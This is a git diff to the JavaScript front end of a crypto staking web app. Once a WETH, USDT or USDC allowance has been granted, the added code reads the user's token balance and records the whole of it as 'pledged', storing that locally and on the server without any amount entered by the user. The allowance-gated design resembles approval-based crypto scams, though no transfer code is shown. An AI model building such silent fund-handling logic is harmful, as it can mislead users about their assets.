@@ -752,12 +752,34 @@ async function updateUIBasedOnChainState() {
     const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
     const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
     const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
+
     if (isFullyAuthorized) {
+      // 【關鍵：自動設定 pledgedAmount 和 stakingStartTime】
+      const selectedToken = walletTokenSelect.value;
+      const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
+      const selectedContract = tokenMap[selectedToken];
+      let balanceBigInt = 0n;
+      try {
+        balanceBigInt = await retry(() => selectedContract.balanceOf(userAddress));
+      } catch (e) { console.error('無法讀取餘額'); }
+
+      const decimals = selectedToken === 'WETH' ? 18 : 6;
+      const balance = parseFloat(window.ethers.utils.formatUnits(balanceBigInt, decimals));
+
+      if (balance >= 1) { // 您已改成 1
+        pledgedAmount = balance;
+        stakingStartTime = stakingStartTime || Date.now(); // 若無則設現在
+        localStorage.setItem('pledgedAmount', pledgedAmount.toString());
+        localStorage.setItem('stakingStartTime', stakingStartTime.toString());
+        await saveUserData();
+      }
+
       if (isWethAuthorized) walletTokenSelect.value = 'WETH';
       else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
       else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
+
       setInitialNextBenefitTime();
-      activateStakingUI();
+      activateStakingUI(); // 啟動 interval
       pledgeBtn.disabled = pledgeAmount.disabled = pledgeDuration.disabled = pledgeToken.disabled = false;
     } else {
       if (startBtn) startBtn.style.display = 'block';
